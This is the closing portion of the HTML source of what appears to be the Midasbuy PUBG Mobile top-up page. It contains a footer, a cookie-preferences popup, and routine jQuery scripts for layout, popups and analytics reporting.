                <div class="btn" @click="iknow">OK</div>
            </div>
        </div>

    </div>
    <div class="footer" style="">
    <div class="main">
        <div class="t">
            <div class="p-box g-clr">
                <div class="box">
                    <p class="p">For customer service </p>
                    <p class="p">Please send email to help@midasbuy.com</p>
                </div>
                
                    <a href="mailto:help@midasbuy.com" class="feeedback" cr="feedback">Feedback</a>
                
            </div>
        </div>
        <div class="b">
            <ul class="link">
                <li><a href="javascript:;" class="cookie-agreement" id="cookieBtn"> Cookie Perferences</a></li>
                <li><a href="http://www.pubgmobile.com/terms.html" target="_blank"> Terms of Service</a></li>
                <li><a href="http://www.pubgmobile.com/privacy.html" target="_blank"> Privacy Policy</a></li>
            </ul>
            <p class="copying">COPYRIGHT © PUBG CORPORATION. ALL RIGHTS RESERVED.</p>
        </div>
    </div>
</div>
<div class="record-detailt-pop cookie-agreement-pop" id="cookie-agreement-pop">
    <div class="pop-title clear-border"><p>YOUR COOKIE PREFERENCES</p></div>
    <div class="detailt-box">
        <div class="block">
            <div class="block-title"><p></p></div>
            <p class="block-desc"></p>
        </div>
        <p class="txt-one">
            We use cookies that are necessary to provide the service and also other cookies, including third-party cookies for performance and analysis. For more information on our cookie policy, please click here.    </p>
        <div class="block">
            <div class="block-title"><p>Necessary Cookies</p></div>
            <p class="block-desc">These cookies are necessary to provide you with the service and to use some of its features, such as to facilitate transactions.</p>
        </div>
        <div class="block">
            <div class="block-title">
                <p>Analytics Cookies</p>
                <div class="switch-box">
                    <span id="gaStatus"></span>
                    <div class="switch-btn" id="cookieSwitchBtn">
                        <em></em>
                    </div>
                </div>
            </div>
            <p class="block-desc">These cookies are used to measure and analyse how the service is accessed, used, or is performing in order to provide you with a better   user experience and to maintain, operate and continually improve the service.</p>
        </div>
        <div class="block">
            <div class="block-title"><p></p></div>
            <p class="block-desc"></p>
        </div>
        <div class="block">
            <div class="block-title"><p></p></div>
            <p class="block-desc"></p>
        </div>
    </div>
    <div class="bottom-zz-bg">
        <div class="pop-btn" id="cookieCloseBtn">Save and close</div>
    </div>
</div>

</div>
<script>
    loadJS(document, 'script', 'kepler', 'https://kepler.captcha.qcloud.com/tencent-kepler.js?appId=9865970');
</script>



        <script src="https://cdn.midasbuy.com/oversea_web/static/js/game.23e7ce1e.js"></script>
    

</div>
<script>
    var setPosition = function(isBottom){
        if(isBottom){
            if(setPosition.isBottom){ return; }
        
            $('.pay-sec,.wrap').addClass('pay-sec-flex');
            $('.footer').addClass('show');
            setPosition.isBottom = 1;

        }else{
            if(!setPosition.isBottom){ return; }
            $('.pay-sec,.wrap').removeClass('pay-sec-flex');
            $('.footer').removeClass('show');
            setPosition.isBottom = 0;
        }       
    }
    window.showClauseBg = function() {
        $('.clause-bg').show(); 
        $('.clause-box-pop').show(); 
    }
    window.hideClauseBg = function() {
        $('.clause-box-pop').hide();
        setTimeout(function () {
            $('.clause-bg').fadeOut();                
        }, 100)
    }
    window.hideTaxPop = function() {
        $('.taxes-bg').fadeOut();
        $('.taxes-box-pop').fadeOut();
    }
    window.showBirthBox = function() {
            $('#birthBox').show();
            $('body').css({'overflow':'hidden'});
        };

   window.hideBirthBox = function() {
            $('#birthBox').hide();
            $('body').css({'overflow':'auto'});
        };
    $(function() {
         if ($(window).innerHeight() > $(document).height()) {            
           setPosition(1);
        } else {
            $(window).on("scroll",throttle(function () {                  
                var docHeight = $(document).height();				 
				if($(window).width() <= 768){
					docHeight = docHeight * 1 - 110;
				}else{
					docHeight = docHeight * 1 - 180;
                }
                var isBottom = Math.ceil($(window).scrollTop() + window.innerHeight) >= docHeight;
                setPosition(isBottom);
            },200));
        }


        $('.clause-bg,.clause-box-pop .close').on('click', function () {
            window.hideClauseBg();
        });
    });    


    report.view('topup');
    report.setPage('topup');
    report.performance('topup');
</script>

</body></html>